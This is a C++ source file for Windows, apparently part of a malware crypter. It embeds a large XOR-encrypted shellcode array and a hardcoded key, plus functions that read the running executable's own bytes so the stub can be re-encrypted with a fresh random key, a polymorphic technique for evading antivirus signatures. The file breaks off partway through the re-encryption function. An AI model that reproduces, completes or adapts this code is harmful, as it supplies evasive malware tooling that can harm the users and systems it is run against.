#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <array>
#include <cstring>  
#include <windows.h>  

const size_t STUB_OFFSET = 0x4240;  
const size_t STUB_SIZE = 2518;      
const size_t KEY_OFFSET = 0x4c20;   
const size_t KEY_SIZE = 32;          








const unsigned char encrypted_stub[] = { // example shellcode
    0xA5, 0x32, 0xA6, 0x68, 0x09, 0x3B, 0x02, 0xE5, 0x3C, 0x2E, 0xDE, 0x7F, 0x29, 0x8E, 0x90, 0xEE, 0x6D, 0x1C, 0xA8, 0x49, 0x4F, 0x8B, 0x9A, 0xFF, 0xD5, 0x3F, 0xF0, 0xA5, 0x62, 0xA3, 0x82, 0x84, 0xF3, 0x7A, 0x4B, 0x15, 0x05, 0x9C, 0x96, 0xAD, 0x11, 0xAD, 0x32, 0x5F, 0xA7, 0x02, 0xD4, 0xCA, 0x1F, 0xEC, 0x51, 0xAF, 0x11, 0x48, 0xB4, 0xF7, 0x7D, 0xE3, 0x84, 0x1D, 0x0C, 0x1B, 0xE9, 0x84, 0x95, 0xF3, 0x69, 0xB8, 0x37, 0x00, 0x83, 0x15, 0x74, 0xAD, 0x54, 0xD6, 0x85, 0xAF, 0xE8, 0x56, 0x01, 0x54, 0x23, 0xAF, 0x77, 0xC1, 0x96, 0x5A, 0x43, 0x7F, 0xC3, 0xA5, 0x62, 0x1B, 0x8F, 0x0D, 0xB7, 0x5E, 0x51, 0x24, 0x73, 0xB8, 0xE6, 0x15, 0x12, 0x24, 0x76, 0x7B, 0xBF, 0x33, 0xBE, 0xEE, 0x6D, 0x54, 0x45, 0x26, 0x95, 0x6C, 0x52, 0x7E, 0x39, 0xC7, 0x48, 0xC1, 0x62, 0x1B, 0xE9, 0xE2, 0x7A, 0xFE, 0x09, 0x1E, 0x41, 0xB8, 0xE6, 0xAD, 0x18, 0xAD, 0x32, 0x5F, 0xA7, 0x02, 0x14, 0xCA, 0xE9, 0x54, 0x23, 0xAF, 0xA9, 0x24, 0xD2, 0x7E, 0x39, 0xA1, 0x79, 0x21, 0x46, 0x9D, 0xE9, 0x84, 0xF3, 0x49, 0xED, 0xFA, 0xC8, 0x3C, 0xC2, 0x9D, 0x74, 0xAD, 0x32, 0x99, 0x85, 0xAF, 0xD0, 0xA2, 0xAB, 0x10, 0x07, 0xEE, 0x7E, 0x8E, 0x96, 0x5A, 0x7B, 0xA6, 0x36, 0xE1, 0x46, 0x58, 0x8D, 0x42, 0xB7, 0x5E, 0x69, 0xD0, 0x87, 0xFC, 0xC2, 0x50, 0x1D, 0x6B, 0x76, 0x7B, 0x87, 0xE9, 0x56, 0xAA, 0x49, 0x13, 0x51, 0x69, 0x55, 0x6C, 0x9A, 0x1F, 0xFF, 0x83, 0xD4, 0xEC, 0x10, 0xDD, 0xAD, 0xA0, 0xB9, 0x03, 0xEB, 0xD8, 0x65, 0xF3, 0xA7, 0xD3, 0x30, 0x89, 0x7E, 0x5F, 0x07, 0xCF, 0xB4, 0xBE, 0x2A, 0x92, 0x67, 0x8B, 0x40, 0x2D, 0x14, 0x3A, 0x1D, 0x95, 0x84, 0x63, 0x26, 0x3F, 0xBA, 0xD4, 0x35, 0x3E, 0x09, 0xC8, 0x33, 0x7E, 0xA2, 0x31, 0x21, 0xC2, 0xF4, 0x1B, 0xE5, 0xDD, 0xF3, 0x28, 0x29, 0x70, 0x74, 0xEE, 0xD7, 0x0C, 0xF6, 0x26, 0x5D, 0x01, 0xB4, 0x81, 0x3B, 0x7F, 0x2F, 0xC0, 0xD7, 0x20, 0x5F, 0x5A, 0x05, 0x9C, 0xBD, 0x70, 0xB2, 0xE9, 0x16, 0x03, 0xB2, 0x4D, 0xD4, 0xCA, 0x30, 0x27, 0xE5, 0xEB, 0x35, 0x16, 0xD2, 0xB8, 0x7D, 0xE3, 0xD0, 0xD0, 0xA4, 0x5F, 0xCD, 0xA5, 0x80, 0xBC, 0x69, 0xB8, 0x63, 0xDD, 0x20, 0x51, 0x50, 0x8E, 0x40, 0x99, 0x85, 0xAF, 0xB4, 0xDD, 0xAB, 0x10, 0x07, 0x8A, 0x23, 0x8E, 0x96, 0x5A, 0x1F, 0xE9, 0x36, 0xE1, 0x46, 0x3C, 0x8D, 0x42, 0xB7, 0x5E, 0x05, 0xF0, 0x87, 0xFC, 0xC2, 0x3C, 0x18, 0x6B, 0x76, 0x7B, 0xEB, 0x8B, 0x56, 0xAA, 0x49, 0x64, 0x6E, 0x69, 0x55, 0x6C, 0xE3, 0x1B, 0xFF, 0x83, 0xD4, 0x97, 0x11, 0xDD, 0xAD, 0xA0, 0xC0, 0x09, 0xEB, 0xD8, 0x65, 0x8C, 0x87, 0xD3, 0x30, 0x89, 0x07, 0x38, 0x07, 0xCF, 0xB4, 0xD8, 0x08, 0x92, 0x67, 0x8B, 0x26, 0x0A, 0x14, 0x3A, 0x1D, 0xFF, 0x9F, 0x63, 0x26, 0x3F, 0xD0, 0xFC, 0x35, 0x3E, 0x09, 0xA6, 0x16, 0x7E, 0xA2, 0x31, 0x4F, 0xAD, 0x8A, 0x17, 0xC1, 0x8B, 0x90, 0x88, 0xE4, 0xD0, 0x07, 0x3F, 0x11, 0x48, 0xD2, 0xC6, 0x5C, 0xC7, 0xF0, 0xA5, 0x04, 0x92, 0x6D, 0xA0, 0x61, 0x7A, 0x2D, 0x9C, 0xF9, 0xD4, 0xE6, 0x15, 0x74, 0xCB, 0xBB, 0xDB, 0xE5, 0x1F, 0x90, 0xEE, 0x6D, 0xEC, 0x4F, 0xAF, 0x11, 0x48, 0xB4, 0xF7, 0xBD, 0xE3, 0x66, 0xA5, 0x62, 0x1B, 0x51, 0xEB, 0xF3, 0x7A, 0x2D, 0xFA, 0xC8, 0x3C, 0xC2, 0x8D, 0x74, 0xAD, 0x32, 0xE7, 0xE1, 0x8B, 0x90, 0xEE, 0x0B, 0xDD, 0xA7, 0x8B, 0x8B, 0x48, 0xD2, 0x7E, 0x81, 0x90, 0xF0, 0xA5, 0x62, 0x7D, 0x60, 0x00, 0xD7, 0xE6, 0x2D, 0x9C, 0x41, 0x00, 0x89, 0x15, 0x74, 0xAD, 0x54, 0xD6, 0x45, 0xAF, 0x0E, 0xEE, 0x6D, 0x54, 0x9B, 0xDD, 0x11, 0x48, 0xD2, 0x18, 0xB0, 0x43, 0xD4, 0x05, 0x62, 0x1B, 0xE9, 0x3C, 0x9F, 0x7A, 0x2D, 0x9C, 0x27, 0x31, 0x62, 0x31, 0xD6, 0xAD, 0x32, 0x5F, 0x79, 0xEF, 0x90, 0xEE, 0x6D, 0x32, 0xAA, 0x2B, 0x35, 0xEC, 0xD2, 0x7E, 0x39, 0x7F, 0xD1, 0xA5, 0x62, 0x1B, 0x8F, 0x0D, 0x77, 0x5E, 0x8B, 0x9C, 0x41, 0xB8, 0xD5, 0xD5, 0x12, 0x24, 0xB6, 0x7B, 0x69, 0x8B, 0x90, 0xEE, 0xD5, 0x10, 0x23, 0xAF, 0x11, 0x2E, 0x5B, 0x3A, 0x1D, 0xA7, 0x48, 0xC0, 0x62, 0x1B, 0xE9, 0xE2, 0x7A, 0x3E, 0x09, 0xFE, 0xF9, 0xD5, 0xE6, 0x15, 0x74, 0xCB, 0xBB, 0x1B, 0xE5, 0xEF, 0x28, 0x81, 0x6D, 0x54, 0x23, 0xC9, 0x98, 0x0C, 0xF6, 0x18, 0x81, 0xE6, 0xF0, 0xA5, 0x62, 0x7D, 0x60, 0xC0, 0xD7, 0x12, 0x1E, 0x5C, 0x27, 0x31, 0xA2, 0x31, 0x1E, 0xE5, 0xBF, 0x13, 0xE5, 0xFB, 0x78, 0xDB, 0x6E, 0x54, 0x23, 0xE7, 0x98, 0xCC, 0xF6, 0xCE, 0x39, 0xC7, 0xF0, 0xED, 0xE1, 0xA7, 0xCD, 0x34, 0xF3, 0x7A, 0x2D, 0x9C, 0x34, 0xB2, 0x5E, 0x14, 0x74, 0xAD, 0x32, 0xB6, 0x19, 0x8B, 0x90, 0xEE, 0x25, 0xD9, 0x77, 0x8B, 0x51, 0x00, 0x59, 0xF2, 0x1D, 0x77, 0xF0, 0xA5, 0x62, 0xF3, 0x27, 0x84, 0xF3, 0x7A, 0x65, 0x15, 0xC5, 0x9C, 0x5E, 0x15, 0x74, 0xAD, 0x7A, 0xDC, 0x7D, 0xAF, 0x28, 0xEE, 0x6D, 0x54, 0x23, 0xDA, 0x1B, 0xF0, 0xD0, 0x7E, 0x39, 0xC7, 0x19, 0x0C, 0x62, 0x1B, 0xE9, 0xCC, 0x7E, 0x2E, 0x09, 0xCC, 0x09, 0x33, 0x6A, 0x31, 0xC4, 0xAD, 0x32, 0x5F, 0x29, 0x14, 0x90, 0xEE, 0x6D, 0x1C, 0xAA, 0x2B, 0x35, 0x88, 0xD2, 0x7E, 0x39, 0x8F, 0x73, 0x19, 0x46, 0xDB, 0xE9, 0x84, 0xF3, 0x7A, 0x58, 0x9B, 0xF9, 0xBB, 0xE6, 0x15, 0x74, 0x46, 0x4F, 0x17, 0x4A, 0x0F, 0xB4, 0x56, 0x6D, 0x54, 0x23, 0xE7, 0x98, 0xCC, 0xF6, 0xAE, 0x39, 0xC7, 0xF0, 0xED, 0xE9, 0x9F, 0xCD, 0x44, 0xF3, 0x7A, 0x2D, 0xD4, 0xC8, 0x3C, 0xC2, 0xF5, 0x74, 0xAD, 0x32, 0x17, 0x4C, 0xC7, 0xB4, 0xCE, 0x92, 0xC0, 0x07, 0x7F, 0x11, 0x48, 0xD2, 0x36, 0xB0, 0x43, 0xD4, 0x7D, 0x62, 0x1B, 0xE9, 0xCC, 0x7E, 0x2E, 0x09, 0xAC, 0x09, 0x33, 0x6A, 0x31, 0xAC, 0xAD, 0x32, 0x5F, 0x3E, 0x1F, 0xB4, 0x0E, 0x6D, 0x54, 0x23, 0xE7, 0x98, 0xCC, 0xF6, 0xB6, 0x39, 0xC7, 0xF0, 0xED, 0xE1, 0xA7, 0xCD, 0x4C, 0xF3, 0x7A, 0x2D, 0x9C, 0x34, 0xBF, 0x5E, 0x11, 0x74, 0xAD, 0x32, 0xB4, 0xDA, 0xCE, 0xA3, 0x27, 0x21, 0xD9, 0x67, 0x8B, 0x71, 0x00, 0x5F, 0xEA, 0x1D, 0x57, 0xF0, 0xA5, 0x62, 0x28, 0x20, 0x7B, 0x67, 0x5E, 0xE5, 0x9C, 0x41, 0xB8, 0xD5, 0xD5, 0x3C, 0x2C, 0xF6, 0xA7, 0xC1, 0x8B, 0x90, 0x2D, 0x25, 0xDD, 0x77, 0x8B, 0x01, 0x00, 0x5B, 0x32, 0x1D, 0xCF, 0xB8, 0x26, 0x8E, 0x63, 0xA1, 0x0F, 0x77, 0x5E, 0xAD, 0x9C, 0x41, 0xB8, 0xAE, 0x9C, 0x30, 0x89, 0x02, 0x17, 0x4A, 0xCF, 0xB4, 0xDE, 0x62, 0xE3, 0x23, 0x92, 0x5C, 0x12, 0xD2, 0x7E, 0x4D, 0xC0, 0xC3, 0x65, 0x8B, 0x19, 0xEB, 0x84, 0xF3, 0x32, 0xA6, 0xD8, 0x65, 0x88, 0xAE, 0x76, 0x34, 0x91, 0x7A, 0xD4, 0x4D, 0xAF, 0x10, 0xEE, 0x6D, 0x54, 0x6B, 0xAC, 0xD9, 0x00, 0x59, 0xBF, 0x71, 0x4E, 0xB4, 0x81, 0x22, 0xA3, 0xE1, 0x84, 0xF3, 0x7A, 0x65, 0xF7, 0x81, 0xB8, 0xAE, 0x9E, 0x38, 0x89, 0x72, 0x17, 0x4C, 0x0F, 0x91, 0x66, 0x6D, 0x54, 0x23, 0xE7, 0x98, 0x0C, 0xF6, 0x46, 0x71, 0x4C, 0xB4, 0x81, 0x5A, 0x98, 0xD1, 0x84, 0x86, 0x7D, 0x1E, 0x5C, 0xA8, 0x02, 0xE7, 0x15, 0x74, 0xE5, 0xB9, 0x1B, 0xE5, 0xB3, 0x1B, 0xEE, 0xE4, 0x10, 0x07, 0xB7, 0x9A, 0x0C, 0xF6, 0x66, 0x71, 0xC4, 0x74, 0x81, 0xE2, 0x1B, 0xE9, 0x84, 0xBB, 0xF3, 0x69, 0xB8, 0x51, 0xF0, 0x6D, 0x51, 0x50, 0xBD, 0xB9, 0x1F, 0xD9, 0xC3, 0x19, 0xAA, 0x49, 0x1C, 0x6B, 0x24, 0x55, 0x6C, 0xC2, 0xF5, 0x79, 0xDB, 0x79, 0xE1, 0x46, 0x3F, 0xA1, 0x0F, 0xB7, 0x5E, 0x3D, 0x17, 0x01, 0x98, 0x6F, 0x51, 0x50, 0xB1, 0x7A, 0xD4, 0x85, 0xAF, 0x80, 0x65, 0x2D, 0x70, 0xAA, 0xEB, 0x35, 0x68, 0x9A, 0xB9, 0x7D, 0xE3, 0xF8, 0xA5, 0x62, 0x1B, 0xE9, 0x6F, 0xFE, 0x32, 0xA6, 0xD8, 0x65, 0xB0, 0xAE, 0xEA, 0xB4, 0xE5, 0xBB, 0x1B, 0xE5, 0x83, 0xD8, 0x65, 0x29, 0x70, 0x6B, 0xE7, 0x28, 0x0C, 0xF6, 0x76, 0x36, 0x44, 0xB3, 0xA4, 0x62, 0x1B, 0x62, 0xC0, 0xD7, 0x66, 0x65, 0x17, 0xCD, 0x9C, 0x66, 0x15, 0x74, 0xAD, 0x7A, 0x5C, 0x09, 0xC3, 0x1B, 0x2F, 0x25, 0xDF, 0x6F, 0x8B, 0x19, 0x00, 0x5F, 0x7A, 0xB1, 0x8F, 0x79, 0xE1, 0x46, 0x43, 0x62, 0xC0, 0xD7, 0x5A, 0x65, 0x17, 0xCD, 0x9C, 0x66, 0x15, 0x74, 0xAD, 0x7A, 0x5C, 0x09, 0xC3, 0x1B, 0x2F, 0x25, 0xDF, 0x6F, 0x8B, 0x19, 0x00, 0x5F, 0x7A, 0x71, 0x8F, 0x79, 0xE1, 0x46, 0x4B, 0x62, 0xC0, 0xD7, 0x5E, 0x65, 0x17, 0xCD, 0x9C, 0x66, 0x15, 0x74, 0xAD, 0x7A, 0x5C, 0x09, 0xC3, 0x1B, 0x2F, 0x25, 0xDF, 0x6F, 0x8B, 0x41, 0x47, 0x65, 0x77, 0x71, 0x4A, 0xF4, 0x2D, 0x2A, 0x92, 0xAD, 0xA0, 0x93, 0x32, 0xA6, 0xD8, 0x65, 0xE0, 0x6D, 0x15, 0x3C, 0x26, 0xBE, 0x7B, 0x41, 0x8B, 0x90, 0xEE, 0x25, 0x57, 0xEB, 0xE7, 0x9A, 0x89, 0x9A, 0xF7, 0x7D, 0xE3, 0xD8, 0xED, 0xA5, 0x1F, 0xCD, 0x84, 0xF3, 0x7A, 0x2D, 0xD4, 0x86, 0xBC, 0xC2, 0x15, 0x74, 0xAD, 0x32, 0xB4, 0xCA, 0xC3, 0x1B, 0xEA, 0x49, 0x1C, 0xDC, 0x6F, 0x59, 0xC1, 0xD6, 0x5A, 0x71, 0x4C, 0xF4, 0x81, 0x2A, 0x90, 0x65, 0xA0, 0x7B, 0x7A, 0x2D, 0x9C, 0x09, 0xBB, 0x2E, 0x5D, 0xFF, 0x6C, 0x3D, 0xE1, 0xC1, 0x0E, 0x50, 0x9A, 0x28, 0x1C, 0xA8, 0xAB, 0x35, 0x00, 0x59, 0x32, 0x1D, 0xEF, 0xB8, 0xA6, 0xAA, 0x53, 0x62, 0x45, 0xFC, 0xC4, 0x2D, 0x19, 0x81, 0xCC, 0xC9, 0x5D, 0xFF, 0xA9, 0x16, 0x17, 0x4A, 0x07, 0xB4, 0x66, 0x6D, 0x54, 0x23, 0xE7, 0x12, 0x80, 0x9A, 0xF5, 0xF8, 0xC8, 0x4E, 0xA5, 0x2A, 0x90, 0xE5, 0xA0, 0xBB, 0xF1, 0x79, 0xB8, 0x69, 0xF0, 0xE5, 0xC4, 0x3C, 0x26, 0xF8, 0x50, 0x7F, 0x82, 0xAB, 0x2F, 0x19, 0x56, 0xC8, 0xAD, 0xFA, 0xDF, 0x9A, 0xF5, 0x3D, 0xE3, 0xB8, 0x2E, 0xEE, 0x3F, 0x61, 0x84, 0xF3, 0x7A, 0x65, 0x9F, 0x89, 0xF0, 0x6D, 0xD4, 0x7B, 0x13, 0x32, 0xDA, 0x01, 0xFE, 0xBD, 0xA6, 0xE6, 0x50, 0x07, 0xE7, 0x9A, 0x04, 0xF6, 0x56, 0x71, 0xC4, 0x38, 0xED, 0xE9, 0xDA, 0xE6, 0x3A, 0xF3, 0xFF, 0xED, 0xE9, 0x56, 0xF0, 0x6D, 0x51, 0x50, 0xCD, 0xB9, 0x5F, 0x89, 0x00, 0x1C, 0xCA, 0xED, 0x54, 0x23, 0xAF, 0x59, 0x4B, 0x1A, 0x36, 0xB2, 0x06, 0x1B, 0xA2, 0x8B, 0xBB, 0x17, 0x7B, 0x0C, 0x49, 0xED, 0xD4, 0xC2, 0x7C, 0x9E, 0xD6, 0x3C, 0x24, 0x7E, 0x7B, 0xC9, 0xDD, 0xC7, 0xA6, 0xEE, 0xB8, 0x4B, 0xE7, 0xD6, 0x0C, 0xF6, 0x4E, 0x39, 0xC7, 0xF0, 0xA5, 0x07, 0x53, 0x62, 0x80, 0xD6, 0x1A, 0x2D, 0x9C, 0x41, 0xF0, 0x6F, 0x51, 0x50, 0x9D, 0x7A, 0xD4, 0x85, 0xAF, 0xA0, 0xA6, 0xE6, 0x14, 0x3B, 0xE7, 0x98, 0x0C, 0xF6, 0x46, 0x71, 0x4A, 0xB4, 0x81, 0x2A, 0x53, 0x62, 0xC8, 0xD7, 0x42, 0x65, 0x17, 0xB9, 0xF0, 0x6B, 0x64, 0x64, 0x14, 0x22, 0x5F, 0xC1, 0x8B, 0x63, 0x4A, 0x25, 0xDF, 0x67, 0x8B, 0x59, 0x00, 0x5B, 0x3A, 0x1D, 0x87, 0xB8, 0x2E, 0x26, 0x3F, 0xA9, 0xCC, 0x7A, 0x3E, 0x09, 0xBC, 0x09, 0x3B, 0x9A, 0x31, 0x54, 0xAD, 0x3D, 0xDB, 0x07, 0x8A, 0x90, 0xEE, 0x25, 0xDF, 0x67, 0x8B, 0x31, 0x00, 0x51, 0x06, 0x09, 0xC7, 0xFF, 0x21, 0xD4, 0x1A, 0xE9, 0x84, 0xBB, 0xF1, 0x69, 0xB8, 0x61, 0xF0, 0x65, 0x6D, 0x14, 0xAD, 0x47, 0x5D, 0x2A, 0x5D, 0xD8, 0x65, 0x29, 0x70, 0x03, 0xE7, 0x9A, 0x08, 0xB2, 0x36, 0xB0, 0x83, 0xD4, 0xBD, 0x2A, 0xDC, 0xED, 0xA0, 0xF3, 0x7A, 0x2D, 0x9C, 0x09, 0x7F, 0xE2, 0x31, 0x74, 0xAD, 0x32, 0x5F, 0x2A, 0x80, 0xD8, 0x65, 0x69, 0x70, 0x6B, 0x50, 0xD1, 0x00, 0x5B, 0x7A, 0x1D, 0x8F, 0x7B, 0x21, 0x46, 0x9B, 0xE9, 0x84, 0xF3, 0x32, 0xA6, 0x90, 0x65, 0xB7, 0x51, 0x11, 0x3C, 0x28, 0xF2, 0x50, 0x45, 0xA8, 0x91, 0xEE, 0x6D, 0x1C, 0xA8, 0xEB, 0x35, 0x50, 0x9A, 0xF5, 0x35, 0xE3, 0xFF, 0x12, 0x66, 0x53, 0x6C, 0x44, 0xFC, 0xFE, 0x23, 0x9D, 0x41, 0xB8, 0xAE, 0x9E, 0xF0, 0x89, 0xB2, 0x5F, 0xC1, 0x8B, 0xD8, 0x65, 0x61, 0x70, 0x2C, 0x18, 0x15, 0x00, 0x51, 0x86, 0x63, 0xB8, 0xA0, 0xED, 0xE9, 0x9F, 0xCD, 0x04, 0xF3, 0x7A, 0x2D, 0xD4, 0xCA, 0xB4, 0xC2, 0x1A, 0xC3, 0xA9, 0x7A, 0xDC, 0x39, 0xCA, 0xEC, 0xD5, 0x25, 0xDF, 0xA7, 0x8B, 0x91, 0x48, 0xD2, 0x7E, 0x71, 0x4C, 0xFC, 0x81, 0x6D, 0xAC, 0xED, 0xCC, 0x70, 0x92, 0x6C, 0x1F, 0x81, 0xD9, 0x6F, 0x51, 0x50, 0x85, 0x7A, 0xD4, 0x45, 0xAF, 0x10, 0xEE, 0x6D, 0x54, 0x6B, 0x24, 0x1D, 0x6C, 0xDD, 0xC9, 0x6D, 0xE3, 0xD8, 0xC3, 0xEB, 0x0F, 0xA1, 0x8B, 0x44, 0x3E, 0x09, 0xB4, 0x27, 0x31, 0xA2, 0x31, 0x7C, 0x46, 0x27, 0x17, 0x4A, 0x0F, 0xB4, 0x6E, 0x6D, 0x54, 0x23, 0xE7, 0x9A, 0x44, 0xF6, 0x71, 0x8E, 0xC3, 0xB8, 0xC3, 0xEB, 0x5F, 0xCD, 0x8C, 0xFC, 0xCD, 0x69, 0xB8, 0x49, 0xDE, 0x6F, 0x51, 0x50, 0xA1, 0x7A, 0xD4, 0x85, 0xAF, 0x88, 0xA6, 0xE6, 0x58, 0x07, 0xA0, 0xA6, 0x4C, 0x9A, 0xFD, 0xC1, 0x9D, 0x8F, 0xE2, 0x2A, 0x90, 0xAD, 0xA0, 0xEB, 0x32, 0xA6, 0x90, 0x65, 0xB7, 0x51, 0x11, 0x3C, 0x2E, 0xCA, 0x1E, 0xBD, 0xBE, 0xD8, 0x65, 0x29, 0x70, 0x3B, 0xE7, 0x9A, 0x44, 0xF6, 0x71, 0x8E, 0xC3, 0xB8, 0x26, 0x8A, 0x5A, 0x6A, 0x44, 0x92, 0xF3, 0x69, 0xB8, 0x6D, 0xF0, 0x6D, 0x51, 0x50, 0xB5, 0x7A, 0xD4, 0xCD, 0xAF, 0x9F, 0x59, 0x39, 0x70, 0x0F, 0xC9, 0x98, 0x5C, 0x9A, 0x71, 0x8E, 0x83, 0xD4, 0x89, 0x04, 0x92, 0xAD, 0xA0, 0xF9, 0x91, 0x3F, 0xD4, 0xCA, 0xFC, 0xC2, 0x0D, 0x3C, 0x26, 0x3E, 0x7B, 0xCE, 0x3C, 0x94, 0xA6, 0x0B, 0xDD, 0x67, 0x8B, 0x1B, 0x47, 0x65, 0x3A, 0x1D, 0xCD, 0x96, 0x2C, 0x26, 0x3F, 0xF9, 0x8B, 0x44, 0x3E, 0x09, 0x90, 0x4E, 0x0F, 0xAA, 0x31, 0x64, 0x96, 0xF3, 0x2B, 0xC3, 0x60, 0x95, 0x07, 0xD7, 0xAA, 0xDC, 0x50, 0x59, 0xC3, 0x56, 0x5A, 0xB9, 0xC7, 0xF0, 0xA5, 0x2A, 0x90, 0xE5, 0xA0, 0xFC, 0xCD, 0x29, 0xD4, 0xC4, 0x78, 0x93, 0x09, 0x3C, 0x26, 0x76, 0x7B, 0xD9, 0xC3, 0x1B, 0xE2, 0x49, 0x5B, 0x94, 0xAB, 0x59, 0xCD, 0x12, 0x0B, 0x32, 0x8F, 0x7B, 0xE1, 0x46, 0x3B, 0xA1, 0x0F, 0xB3, 0x4A, 0xC6, 0x88, 0x09, 0x33, 0xA2, 0x31, 0x54, 0xE5, 0xB9, 0x5F, 0x89, 0x02, 0xD4, 0xCA, 0x4D, 0xBD, 0x0D, 0x51, 0xEE, 0xB7, 0xE1, 0xBE, 0x71, 0x44, 0x34, 0xCD, 0x3D, 0x45, 0x2A, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48, 0xD2, 0x7E, 0x39, 0xC7, 0xF0, 0xA5, 0x62, 0x1B, 0xE9, 0x84, 0xF3, 0x7A, 0x2D, 0x9C, 0x41, 0xB8, 0xE6, 0x15, 0x74, 0xAD, 0x32, 0x5F, 0xC1, 0x8B, 0x90, 0xEE, 0x6D, 0x54, 0x23, 0xAF, 0x11, 0x48          
};

const unsigned char key[] = { // 32 bytes 
    0xf3, 0x7a, 0x2d, 0x9c, 0x41, 0xb8, 0xe6, 0x15,
    0x74, 0xad, 0x32, 0x5f, 0xc1, 0x8b, 0x90, 0xee,
    0x6d, 0x54, 0x23, 0xaf, 0x11, 0x48, 0xd2, 0x7e,
    0x39, 0xc7, 0xf0, 0xa5, 0x62, 0x1b, 0xe9, 0x84,                                           

           
 };





std::vector<uint8_t> xor_crypt(uint8_t* data, size_t data_size, const uint8_t* key, size_t key_size) {
    std::vector<uint8_t> result(data_size);
    for (size_t i = 0; i < data_size; ++i) {
        result[i] = data[i] ^ key[i % key_size];
    }
    return result;
}


// Generate random key
std::vector<uint8_t> generate_key() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::vector<uint8_t> key(KEY_SIZE);
    for (auto& byte : key) {
        byte = static_cast<uint8_t>(dis(gen));
    }
    return key;
}



std::string get_exe_path() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
}


bool reencrypt_exe_stub() {


    std::string exe_path = get_exe_path();
    std::ifstream exe_file(exe_path, std::ios::binary | std::ios::ate);


    size_t exe_size = exe_file.tellg();
    exe_file.seekg(0);
    std::vector<uint8_t> exe_buffer(exe_size);
